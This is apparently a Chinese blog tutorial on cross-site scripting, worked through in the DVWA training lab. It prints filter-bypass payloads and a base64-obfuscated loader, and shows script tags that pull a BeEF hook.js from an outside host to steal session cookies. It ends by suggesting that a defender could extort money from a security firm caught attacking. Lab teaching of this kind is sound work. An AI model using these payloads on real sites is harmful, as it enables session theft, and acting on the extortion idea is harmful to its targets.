@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS | Qeminco'blog</title><meta name="author" content="Qeminco"><meta name="copyright" content="Qeminco"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1. 认识XSSXSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。 由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="https://qeminco.github.io/2022/05/28/xss%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Qeminco&#39;blog">
+<meta property="og:description" content="1. 认识XSSXSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。 由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qeminco.github.io/img/56.jpg">
+<meta property="article:published_time" content="2022-05-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-24T08:17:39.078Z">
+<meta property="article:author" content="Qeminco">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qeminco.github.io/img/56.jpg"><link rel="shortcut icon" href="/img/cat.png"><link rel="canonical" href="https://qeminco.github.io/2022/05/28/xss%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-24 16:17:39'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/kunkun.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/56.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Qeminco'blog"><img class="site-icon" src="/img/cat.png"/><span class="site-name">Qeminco'blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2022-05-27T16:00:00.000Z" title="发表于 2022-05-28 00:00:00">2022-05-28</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-认识XSS"><a href="#1-认识XSS" class="headerlink" title="1. 认识XSS"></a>1. 认识XSS</h1><p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。 由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
+<p>XSS 分类： 1.反射型 2.存储型 3.DOM型</p>
+<p><strong>同源策略</strong></p>
+<p>根据同源策略的规定，只有同协议、同域名、同端口三同的同源站点才能读取另一个同源站点的cookie等资源。</p>
+<p><code>协议://domain:port/path/file</code> </p>
+<p>注：js外链不受同源策略的影响。例如某网站引入的js文件，即使不是同源站点也能调用该js资源。</p>
+<p><img src="/img/20230619211815.png"></p>
+<h1 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h1><p>XSS （Stored）存储型攻击发生的具体情镜：</p>
+<ul>
+<li>黑客发现一个存在XSS漏洞的接口或页面，构造恶意代码（payload）后，将其插入到页面中使得所有浏览该页面的用户均受到安全威胁。</li>
+</ul>
+<p>首先我们进入到DVWA中将难度选择为LOW。之后我们进入XSS（Stored）中。在进行测试前我们可以先对提交点进行审查元素。 对着目标右键选择审查元素。</p>
+<p><img src="/img/20230619213445.png"></p>
+<p>接下来我们查看两个输入框的属性。 可以看到有输入长度的限制。其中 Name maxlength&#x3D;10 Message maxlength&#x3D;50。不难看出一个长度为10一个长度为50。</p>
+<p>当然对于前端的长度限制我们是可以使用抓包工具去绕过。或者直接在本地修改html属性。如将maxlength改为100，这样前端的输入限制就可以轻松绕过了。</p>
+<p>引申：在安全编码中，将安全的设置放置于用户端，虽然可以减轻服务器的工作量，但是如果服务端没有其他措施的话，则会很轻松的进行绕过。 我们首先尝试使用短 XSS payload 进行尝试。</p>
+<p>payload ： <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="/img/20230619213612.png"></p>
+<p>点击Sign Guestbook提交，成功弹窗，即证明此处存在xss漏洞，此时该恶意代码已被存储到服务端，我们切换到dvwa的其他模块，再切回xss存储模块仍然会弹窗。</p>
+<p><img src="/img/20230619213854.png"></p>
+<h1 id="3-使用beef盗取cookie"><a href="#3-使用beef盗取cookie" class="headerlink" title="3.使用beef盗取cookie"></a>3.使用beef盗取cookie</h1><p>下面我们使用beef配合完成攻击。 这里我们将payload插入页面后，当用户浏览了这个页面，<code>&lt;script&gt;</code>标签就会远程执行我们的beef上面的恶意js代码从而盗取cookie。<br>启动BEEF方法如下: </p>
+<p>在终端输入 <code>beef-xss</code> ，会让你设置一个新的密码，直接输密码然后回车。</p>
+<p><img src="/img/20230620171506.png"></p>
+<p>然后自动弹出beef的页面在浏览器，输入账户beef和设置的密码登录。</p>
+<p><img src="/img/20230620171646.png"></p>
+<p>可以看到左侧有两个文件夹，第一个是上线浏览器的列表，第二个是离线浏览器的列表。</p>
+<p>开启正式的攻击测试： 插入的payload为： <code>&lt;script src=&quot;http://192.168.31.182:3000/hook.js&quot;&gt;&lt;/script&gt;</code> ，其,192.168.31.182为beef工具所在的主机IP，根据实际情况给予修改即可。我们来到dvwa的反射型xss页面输入payload并提交。 </p>
+<p><img src="/img/20230620172602.png"></p>
+<p>查看页面源码，可以看到hook.js这个恶意外链已经被插入到源码里了。</p>
+<p><img src="/img/20230620172842.png"></p>
+<p>再进入之前打开的BEEF界面，可以看到目标浏览器已经上线了。</p>
+<p><img src="/img/20230620173008.png"></p>
+<p>接着查询我们收到的cookie：</p>
+<p> 进入BEEF后我们先点击 <code>Command Browser</code> -&gt; <code>Commands</code> -&gt; 在<code>Searche</code>框输入<code>cookie</code>并回车 -&gt; 进入新的页面后点击右下角<code>Execute</code>-&gt;之后点击中间出现的记录 此时我们就可以在右侧看到我们收到的cookie了。</p>
+<p><img src="/img/20230620173441.png"></p>
+<p><img src="/img/20230620173551.png"></p>
+<p> 完成全部操作后我们将得到一个格式为： phpsessid&#x3D;xxxxxxxxxx;security&#x3D;low样式的cookie。</p>
+<p>再做另一个实验：当用户把页面关掉会发生什么？</p>
+<p>来到浏览器，关闭dvwa的标签页，然后刷新（多刷新几次，因为有延迟）beef工具的页面会发现，刚刚上线的浏览器已经被移动到离线浏览器的文件夹下了。</p>
+<p><img src="/img/20230620174054.png"></p>
+<p>存储型xss也是同样的攻击链条，用户关闭页面同样会让浏览器在beef处于离线状态，但是存储型xss执行成功以后，只要用户再访问xss存储型模块，浏览器立马就会上线，不需要再次攻击，因为恶意代码被存储在服务端了。</p>
+<h1 id="4-漏洞源码分析"><a href="#4-漏洞源码分析" class="headerlink" title="4.漏洞源码分析"></a>4.漏洞源码分析</h1><p>low级别，在DVWA点击ViewSource查看源码</p>
+<p><img src="/img/20230620180611.png"></p>
+<p>首先<code>if( isset( $_POST[ &#39;btnSign&#39; ] ) )</code>,这里是对表单提交的的name属性值为btnSign的值进行效验是否为空值，如果为空值则返回<code>flase</code>，不为空则继续进行下一步操作。 接下来我们可以看见<code>trim</code>函数，这个函数的主要作用就是去除其()内数据的两侧的空白字符或其他预定义字符。而这里处理的就是一post方式提交的name属性值为mtxMessage的数据，处理完后值赋给<code>$message</code>。<code>$name</code>同理。 接下来是<code>stripslashes</code>函数，这个函数一般情况下是伴随着<code>addslashes</code>函数出现，作用是删除由 <code>addslashes</code>函数添加的反斜杠。这里就是将上面由<code>addslashes</code>函数处理<code>$message</code>,<code>$name</code>进行再处理，去掉了\，然后再重新赋值给自己。 接下来就是运用<code>mysql_real_escape_string</code>函数处理<code>$name</code>, <code>mysql_real_escape_string</code>函数会转义 SQL 语句中使用的字符串中的特殊字符。 这些字符包括：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a 接下来就是拼接sql语句，赋值给$query,为下面执行插入数据做准备 紧接着就是一个使用or的赋值判断句，<code>mysql_query()</code> 函数作用执行()内的 MySQL语句进行查询，<code>die()</code> 函数作用是输出()内的数据，并退出当前脚本。在这里也就是先用<code>mysql_query()</code> 函数先行<code>$query</code>里的MySQL语句，如果语句格式没有错误的情况下则执行成功，返回true给$result,反之执行失败，则用die函数输出<code>mysql_error()</code>函数所获取的MySQL 操作产生的文本错误信息，并且退出语句。 分析到这里可以看到，LOW级别的数据处理和过滤过程没有针对XSS做过考量。所以插入的最低级的xss语句就可以获得对应的结果。</li>
+</ul>
+<h1 id="5-dvwa的中级别"><a href="#5-dvwa的中级别" class="headerlink" title="5.dvwa的中级别"></a>5.dvwa的中级别</h1><p>首先我们将DVWA的难度调整为MEDIUM。 </p>
+<p>为了避免干扰，建议进行如下操作： 1 点击页面<code>Setup/Reset DB</code>，然后选择新页面中的<code>create/Reset Database</code> 2 通过重置数据库可以清除掉我们之前留下的记录。</p>
+<p>接下来我们尝试插入代码。 做过多次测试其中发现name框存在<code>&lt;script&gt;</code>标签大小写绕过。 使用payload:<code>&lt;SCriPt&gt;alert(&#39;1&#39;)&lt;/SCriPt&gt;</code> 可以成功进行弹窗。</p>
+<p><img src="/img/20230620180919.png"></p>
+<p><img src="/img/20230620181028.png"></p>
+<p>可以看到成功弹窗了，证明存在XSS，下面使用beef来配合攻击。</p>
+<p>真实的窃取cookie： 首先插入payload:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCriPt</span>&gt;</span><span class="language-javascript"> src=<span class="string">&quot;http://192.168.31.182:3000/hook.js&quot;</span></span><span class="tag">&lt;/<span class="name">SCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后我们使用BEEF来盗取cookie。 步骤如之前一样，这里就不在赘述。这次大家可以注意到与上次不同cookie里面有一部分不同，等级从LOW变成了medium。 必须得到一个格式为php&#x3D;xxxxxxxxxx;security&#x3D;medium的cookie</p>
+<p>View Source 查看源码:</p>
+<p><img src="/img/20230620181250.png"></p>
+<p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 在这里就是过滤script这个字符串，意为把<code>&lt;scipt&gt;</code>字符串替换为空，留下其他内容。 因为没有对script的大小写进行限制和识别，这里可以用大小写混合， 比如<code>&lt;ScRiPt&gt;</code>标签进行绕过。</p>
+<p>也可以通过<code>&lt;scr&lt;script&gt;ipt&gt;</code>这样格式的双写绕过。</p>
+<h1 id="6-dvwa的高级别"><a href="#6-dvwa的高级别" class="headerlink" title="6.dvwa的高级别"></a>6.dvwa的高级别</h1><p>high级别的代码分析</p>
+<p><img src="/img/20230620181705.png"></p>
+<p>这里代码和medium整体上没有太大区别，就是多了一个正则表达式来配合<code>preg_replace()</code>函数对$name来进行过滤。 正则匹配的规则变化为<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 可以看到匹配规则加上了<code>/i</code> 不区分大小写。<code>(.*)</code> 的作用是匹配任意数量的非回车的所有字符，所以在测试中也可以发现不管怎么构造payload,只要’’顺序’’出现<code>\&lt;script&gt;</code>都会被屏蔽，这里就输入一个进行尝试。 我们尝试payload: <code>&lt;&gt;ScRiPt11111&gt;</code> ，可以看到同样会被过滤掉，这也说明<code>script</code>标签我们是无法通过大小写的方式绕过了。在防御方面<code>正则表达式</code>有着得天独厚的优势，所以经常被用于php安全编程。 在xss的常见绕过的方式中，使用格式类似 <code>&lt;scr&lt;script&gt;ipt&gt;</code>的payload往往会有意外的收获。但此次测试因为使用了<code>(.*)</code>的模式，则无法进行绕过。</p>
+<p>由于对script的关键字进行了彻底的过滤，为此我们使用payload：<code>&lt;img src=x onerror=alert(1)&gt;</code> 即可成功构造弹窗。</p>
+<p><img src="/img/20230620181816.png"></p>
+<p><img src="/img/20230620181832.png"></p>
+<h1 id="7-存储型xss思考"><a href="#7-存储型xss思考" class="headerlink" title="7.存储型xss思考"></a>7.存储型xss思考</h1><p>低级别中插入弹窗的payload 随后我们切换到high级别 我们会发现依旧弹窗：）</p>
+<p>假如说我们在工作中，生产环境被攻击插入payload，而没有清除数据库，是否还会继续产生危害？</p>
+<p>进阶的思考—-XSS盲打</p>
+<p>盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言啊，feedback啊之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。 “xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。 通俗讲就是见到输入框就输入提前准备的 xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。</p>
+<h1 id="8-self-xss"><a href="#8-self-xss" class="headerlink" title="8 self-xss"></a>8 self-xss</h1><p>假如京东的个人订单页面存在xss，有危害吗？</p>
+<p>答案：京东的个人订单页面只有自己能看到，所以这是不被认为有危害的，其专业名词为self-xss。</p>
+<p><a target="_blank" rel="noopener" href="http://hzhcontrols.com/new-1456458.html">实战漏洞挖掘-csrf+存储selfxss漏洞组合拳-WinFrom控件库|.net开源控件库|HZHControls官网</a></p>
+<h1 id="9更多的思路"><a href="#9更多的思路" class="headerlink" title="9更多的思路"></a>9更多的思路</h1><p>在dvwa的高等级当中，由于代码所使用的逻辑通过如下的代码过滤掉了所有基于script标签的可能性。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); </span><br><span class="line"></span><br><span class="line">preg_replace       通过正则表达式替换文字内容</span><br><span class="line">/i               模式中的字符将同时匹配大小写字母。</span><br></pre></td></tr></table></figure>
+
+<p>所以当我们试图进行绕过的尝试输入<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;</code> 后，留在网页中的内容同样只剩余alert(1)的内容。<br>而通过bp扫描器进行漏洞检测，则可以得到相应的payload的攻击方式：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">a</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以通过攻击的演示，那么我们可以发现并不止于script的利用方式。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1 dvwa低级别：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>&#x27;<span class="attr">script</span>&#x27;);<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;http://192.168.0.231:3000/hook.js&#x27;</span>;&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2 dvwa低级别：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vMTkyLjE2OC4wLjIzMTozMDAwL2hvb2suanMn</span>&#x27;))&gt;</span></span><br><span class="line"></span><br><span class="line">3 dvwa低级别：</span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>&#x27;<span class="attr">script</span>&#x27;);<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;http://192.168.0.231:3000/hook.js&#x27;</span>;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server</span><br><span class="line"></span><br><span class="line">通过文件上传浏览页面触发cookie窃取</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://book.fsec.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>点我链接给你好看<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实验中，针对高级别的payload存在不完善地方。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://book.fsec.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>点我链接给你好看<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>原理：跨站脚本攻击，因为js外链不受同源策略影响，并且网站没有对用户输入做严谨的过滤，所以插入恶意的js代码使浏览器产生歧义，导致插入的恶意代码被执行，然后攻击者可利用恶意代码窃取cookie。</p>
+<p>beef与xss平台的使用场景：在没有外网的环境下，无法用xss平台，就用beef。xss平台只能打靶场，严禁代入真实生产环境，因为会把盗取到的信息完全展现给xss平台的拥有者，最好是自己搭一个。</p>
+<p>例外：self-xss和CSRF；插入链接形式的代码诱使用户点击；盲打见框就插。</p>
+<p>xss漏洞正向利用的方案：防守方在自己网站上挂一个js恶意代码，不是为了窃取cookie，因为是自己的网站，偷自己网站的cookie没用，这是为了获取攻击方的ip，并且可以利用xss平台的截图功能截取攻击方的浏览器屏幕，假如对方有一个页面打开的是奇安信什么的，就可以认为是奇安信的工程师发动了攻击，向奇安信讹钱。相当于一个免费的删减版蜜罐。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://qeminco.github.io">Qeminco</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://qeminco.github.io/2022/05/28/xss%E6%BC%8F%E6%B4%9E/">https://qeminco.github.io/2022/05/28/xss漏洞/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://qeminco.github.io" target="_blank">Qeminco'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E6%BC%8F%E6%B4%9E/">web漏洞</a></div><div class="post_share"></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/12/28/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src="/img/8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-28</div><div class="title">SQL注入</div></div></a></div><div><a href="/2022/05/16/XXE/" title="XXE"><img class="cover" src="/img/26.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-16</div><div class="title">XXE</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/kunkun.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Qeminco</div><div class="author-info__description">学习如逆水行舟，不进则退。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">生活明朗，万物可爱。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%AE%A4%E8%AF%86XSS"><span class="toc-number">1.</span> <span class="toc-text">1. 认识XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">2.存储型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8beef%E7%9B%97%E5%8F%96cookie"><span class="toc-number">3.</span> <span class="toc-text">3.使用beef盗取cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">4.漏洞源码分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-dvwa%E7%9A%84%E4%B8%AD%E7%BA%A7%E5%88%AB"><span class="toc-number">5.</span> <span class="toc-text">5.dvwa的中级别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-dvwa%E7%9A%84%E9%AB%98%E7%BA%A7%E5%88%AB"><span class="toc-number">6.</span> <span class="toc-text">6.dvwa的高级别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%80%9D%E8%80%83"><span class="toc-number">7.</span> 